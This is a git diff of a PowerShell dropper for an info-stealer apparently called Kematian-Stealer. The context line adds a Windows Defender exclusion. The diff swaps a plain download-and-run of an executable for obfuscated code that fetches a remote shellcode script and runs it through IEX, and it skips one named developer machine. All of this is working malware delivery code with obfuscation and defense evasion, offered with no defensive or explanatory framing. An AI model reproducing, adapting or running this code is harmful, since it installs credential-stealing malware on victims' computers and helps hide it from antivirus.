@@ -38,8 +38,9 @@ Add-MpPreference -ExclusionPath $dir
 # $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 # Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
-Start-Process -FilePath "$temp\s.exe"
+$shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
 if ($env:USERDOMAIN -ne "DESKTOP-VIGQLDD") {
     # Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skidd.exe"
